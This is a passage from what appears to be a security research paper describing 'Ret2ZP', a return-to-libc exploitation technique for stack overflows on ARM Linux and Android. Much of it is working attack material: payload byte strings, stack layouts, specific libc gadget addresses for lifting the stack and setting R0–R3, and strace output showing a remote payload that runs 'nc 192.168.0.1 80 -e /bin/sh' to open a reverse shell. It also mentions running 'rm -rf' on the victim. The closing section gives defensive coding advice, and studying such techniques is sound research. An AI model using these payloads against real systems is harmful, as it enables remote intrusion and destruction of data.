      "\x45\x45\x45\x45" //R1 
      "\x46\x46\x46\x46" //JUNK 
      "\xB4\xFF\xDC\x41";//SYSTEM 
If we'll put breakpoint on system, this is the status of the relevant places: 
=> R0 - 0x41EAFFE4 ; (&/bin/sh) 
=> R1 - 0x45454545 
=> R4 - 0x43434343 
=> R11- 0x44444444 
And SYSTEM will be called to execute /bin/sh. 
Great success. Although it's good for only local attack, what we really want to 
achieve is get a remote-shell as-well, let's do it! 
----[ 2.2 Ret2ZP (Return To Zero Protection) - For Remote Attacker 
Local attacks are good, but we want to run commands, from remote, which is much 
better, and also can be used on Local attacks as-well. So let's investigate it further: 
For example, if we've already got R0 to point to /bin/sh string, and the size of our 
buffer is [64], because the SYSTEM function will smash our place in stack (except for 
using a small size buffer 
like [16] where you get shared DWORD of buffer which is not smashed by SYSTEM 
function), our command will not be executed! We need to use tricks in-order to 
bypass the self stack-smashing. 
Let's say, we're calling other function who's using R4,R5,R6 and LR which will 
translate later to PC, our buffer will look like this : 
|----------------|----------|------------|----------------|-----------------|---4 bytes--|---4 bytes-----|--4 bytes----|---4 bytes-------| 
| 16 A's         | BBBB     |  R4        |  R11           |   &function     |  R4        |  R5           |   R6        |  &2nd_func      | 
|----------------|----------|------------|----------------|-----------------|------------|---------------|-------------|-----------------| 
|    args        | junk [20]|  R4        |  frame pointer |prog-counter (PC)|  1st param |  2nd param    | 3rd param   |prog-counter (PC)| 
Wait, We cannot always jump into SYSTEM, since the stack is smashed and we 
need to re-adjust it. 
SYSTEM is using ~384 bytes of its own stack, if we do a buf size of [16] 
we get 4 shared bytes [if we're actually jumping to *(SYSTEM+4) which we can jump 
into; 
Jumping into a DWORD of un-overwritten bytes can be good if you're using a local-
privilege escalation attack, but not for remote attack (unless you can write to path). 
I.e : 
you can run : "sh;#AAAAA...." which you can use the first DWORD, it will run sh;# 
and will ignore anything else after the # till there's a null. 
For instance : 
    from strace : [pid  3832] execve("/bin/sh", ["sh", "-c", "sh;#X\332\313\276"...], [/* 19 
vars */]) = 0 
I've entered sh;#AAAAA.... and it translated into sh;#X\332\313\276....\0 because 
SYSTEM had used this stack location for its own use and corrupted it. shame. 
We need to get our stack lifted at ~[384] bytes before or after the SYSTEM function 
so we can also use remote commands such as set password, run nc or rm -rf all of 
the hard-drive :) 
I've searched for a place in libc which I can use to shift my stack up, and do the 
Ret2ZP Attack properly. 
I was looking for something generic for the readers, but it was still easy to find chunk, 
let's look at the epilogue of wprintf and we'll find : 
    41df8954:    e28dd00c     add    SP, SP, #12    ; 0xc 
    41df8958:    e49de004     pop    {LR}        ; (ldr LR, [SP], #4) <--- We need to jump here! 
 ; LR = [SP] 
 ; SP += 4 
    41df895c:    e28dd010     add    SP, SP, #16    ; 0x10        STACK IS LIFTED RIGHT HERE BABY! 
    41df8960:    e12fff1e     bx    LR        ;              <--- We'll get out, here :) 
    41df8964:    000cc6c4     .word    0x000cc6c4 
This was the first thing I've seen in libc.so and that's exactly what I need! 
We'll jump to 0x41df8958 (pop {LR}, or we can jump to 0x41df8954 but we'll have to 
adjust our return accordingly) 
as many times as we want, time after another. Till we get enough of stack lifting we 
want. 
After fixing the stack, we'll jump right back to SYSTEM(), after stack is fixed. perfect 
Ret2ZP Attack! 
In the first case where R0 points to SP when exiting the vulnerable function - Use the 
technique above to fix R0 and keep the calling from this initial lift. 
If we got limited size of buffer, we just need to change SP to point to a specific 
writable region, and it can be made using one call. This method can be used to also 
control the  
amount of lifting (and more generic, by its nature). 
First, let's explain what's bx LR. 
bx {LR} is an unconditional jump to {LR} [which points to SP+4 when executing-
[4bytes+next-command]), but it will also enter to thumb mode if LR[0]==1... ARM is 
awesome! 
It will look something like this: 
|----------------|----------|------------|----------------|-wprintf epilogue|---------------|---4 bytes--...--|------4 bytes--------|---4 bytes-------| 
| 16 A's         | BBBB     |  R4        |  R11           |   &0x41df8958   |....&0x41df8958| &0x41df8958...  |       AAAA          |   &SYSTEM       | 
|----------------|----------|------------|----------------|--stack lifted---|---------------|-----------------|---------------------|-----------------| 
|    args        | junk [20]|  R4        |  frame pointer |prog-counter (pc)|  again. lift  |  again...n times| after enough lifting|  (pc-after lift)| 
After enough lifting we'll get : 
    from strace : [pid  3843] execve("/bin/sh", ["sh", "-c", 
"AAAABBBBCCCCDDDDEEEEFFFFGGGGHX\211\337A"...], [/* 19 vars */]) = 0 
and we got all of our buffer size [16] + 8 bytes to execute whatever we want, which 
should be enough for remote attack as-well. 
i.e : 
    from strace : [pid  3847] execve("/bin/sh", ["sh", "-c", "nc 192.168.0.1 80 -e 
/bin/sh;\211\337A"...], [/* 19 vars */]) = 0 
Ret2ZP : great success! 
----[ 2.3 Ret2ZP - R0..R3 Adjustments 
Other scenario: 
(II) Vulnerable Function returns no parameters (void) but does several stuff using 
arguments R0..R3. (same goes for function returning results) 
In this case, if you want to use the Ret2ZP Attack, you'll have to check the status of 
the registers after the vulnerable function returns. 
You just need one register who points to a relative place where R0 was after the 
string manipulation, and use the Ret2ZP to first adjust the parameter, then to shift the 
stack 
and then to execute payload. Which is good for a more complex command which is 
passed on the buffer itself, but if you need just a simple one you can use : 
The same way it was used in the local attack, you can even control the flow using 
epilogue of functions such as erand48 : 
.text:41DC7348                 LDMFD   SP, {R0,R1}  ; <== R0 & R1 Are adjusted 
.text:41DC734C                 ADD     SP, SP, #0xC ; Adjusting stack by 12 bytes. Meaning 
there will be left 4 bytes of junk. 
.text:41DC7350                 LDMFD   SP!, {PC} ; Going to next 4 bytes after junk. 
check for relative path from other registers such as : 
    Register     Synonym    Special             Role in the procedure call standard 
    R15            PC            The Program Counter. 
    R14            LR            Link Address (Link Register) / Scratch register. 
    R13            SP            Stack Pointer. Lower end of current stack frame. 
    R12            IP            The Intra-Procedure-call scratch register. 
    R11            FP/v8            Frame pointer  / Variable-register 8. 
    R10            sl/v7            Stack limit / Variable-register number 7. 
    R9            sb/tr/v6        Platform register. The meaning of this register is defined by 
the platform standard. 
Really easy to do, and there's great code from libc that can be used for R0..R3 
adjustments. 
Also, You can pop into R0..R3 under certain parts of code in libc.so. Great stuff 
which is more then enough to gain control of affected device. 
For example, You can use the following epilogue from MCOUNT function to pop 
parameters to R0..R3: 
.text:41E6583C mcount 
.text:41E6583C                 STMFD   SP!, {R0-R3,R11,LR} ; Alternative name is '_mcount' 
.text:41E65840                 MOVS    R11, R11 
.text:41E65844                 LDRNE   R0, [R11,#-4] 
.text:41E65848                 MOVNES  R1, LR 
.text:41E6584C                 BLNE    mcount_internal 
.text:41E65850                 LDMFD   SP!, {R0-R3,R11,LR} <=== Jumping here will get you to 
control R0, R1, R2, R3, R11 and LR which you'll be jumping into. 
.text:41E65854                 BX      LR 
.text:41E65854 ; End of function mcount 
If none of them is allowing you to re-produce your SP/R0..R3 on the way of the 
overflow, you can run only other functions/commands from the stuff which is already 
included in the function. 
Like regular ret2libc without getting parameters passed properly, you'll need to adjust 
it to get the proper results, from limited set of payloads (i.e : run /bin/sh or do 
some_func) - Or if  
There are static places you can use them to call each function the way you want it 
and to do whatever you want. Such as enabling the stack and calling our secondary 
payload. 
----[ 2.4 Ret2ZP - Using the attack to enable stack 
You can also do the attack to adjust parameters for MPROTECT() to add execution 
bit to your memory region of which you control. 
Afterward, jump to the stack and run the commands using a prepared shellcode (take 
a look at alphanumeric shellcodes to ARM at (*B), but it's far better developed in 
X86). 
----[ 2.5 Ret2ZP – Hacking Android based phone 
There are many similarities between “regular” Linux, to Android. Android people have 
re-compiled libc to make it a more suitable for their platforms. One of the things you 
can easily notice, is that there are no: “pop .* R0 .*” (Atleast in the libc of the version 
I’ve checked). 
So how will we be able to store our /system/bin/sh (it’s not just /bin/sh in Android) on 
R0? We’ll have to get a bit trickier, but it’s more or less, the same. 
For instance, Take a look at this code: 
mallinfo 
STMFD   SP!, {R4,LR} 
MOV     R4, R0 
BL      j_dlmallinfo 
MOV     R0, R4 
LDMFD   SP!, {R4,PC}  Let’s jump here. 
; End of function mallinfo 
Since there are no pop R0 (intentionally or by mistake, we’ll adjust R4, and store it in 
R0 the next jump). 
So let’s jump to the bolded line above, and we’ll get R4 to store our address of the 
string “/system/bin/sh”. 
After that, we’ll have R4 pointing at it and we still got control of PC, but it’s not 
enough, so let’s jump to the following bolded line: 
mallinfo 
STMFD   SP!, {R4,LR} 
MOV     R4, R0 
BL      j_dlmallinfo 
MOV     R0, R4  Let’s jump here. 
LDMFD   SP!, {R4,PC}  
; End of function mallinfo 
Now, R4 will be moved to R0, and we’ll have R0 pointing to &/system/bin/sh. 
The next instruction will get another 4 bytes for R4 (which are not needed) and 4 
bytes for the next function (&system). A shell will be executed for us. 
So it’s more or less the same. All the above theory of-course applies in this scenario 
as-well. 
You’ll need in the current Android that the process you attack (your own? For 
learning purposes!), was compiled with –fno-stack-protector (or you want to bypass 
that via bruteforce/cookie guessing/cookie overwrite) and dynamically linked. All the 
theory that had been checked on ARM Linux with regular libc will work as-well on 
Android, with some adjustments like the one demonstrated above.
--[ 3.- Conclusions 
In today's world, ARM is extremely common and lots of stuff runs on ARM. In this 
paper is proposed a way of exploiting ARM when the stack isn't executable. 
All the examples from the paper had been tested and worked properly before writing 
it - so it's not only theory, it actually works. 
Working with ARM doesn't mean that you stack-overflow safe, and in this paper the 
payload is actually anything the attacker wants, meaning when writing code on ARM, 
You Should always be careful for buffer operations, check sizes and use safe coding 
functions instead of dangerous functions (like strcpy, memcpy, ..). 
Having safe coding habits can eliminate this threat :). Having the stack not 
executable is not enough, like proven here, adding more security mechanisms is 
important! 
--[ 4.- Acknowledgments 
Special thanks to : 
Ilan (NG!) Aelion - Thank Ilan, Couldn't have done it without you; You're the man! 
Also, I'd like to thank to :  
Moshe Vered – Thanks for the support/help! 
Matthew Carpenter - Thanks for your words on hard times. 
And thanks for Phrack of which I've taken the TXT design. May the lord be with you. 
--[ 5.- Author 
Itzhak (Zuk) Avraham. Researcher for Samsung Electronics. 
blog : http://imthezuk.blogspot.com / http://www.preincidentassessment.com 
For questions/chatting: itz2000 [at] gmail.com 
Under twitter as: @ihackbanme 
Holly       
--[ 6.- Reference : 
(*A) - The APCS ARM Calling Convention : 
http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042d/IHI0042D_aapcs.pdf 
(*B) - AlphaNumeric Shellcodes when stack is executable : 
http://dragos.com/psj09/pacsec2009-arm-alpha.pdf 
(*C) - Alphanumeric ARM shellcode - 
http://www.phrack.com/issues.html?issue=66&id=12 
(*D) - It has some mistakes with where you control the EIP (+4) offset, but you can 
get the general idea from c0ntexb paper : 
http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf 
(*E) – This blog, will also contain updated version of this paper: 
http://imthezuk.blogspot.com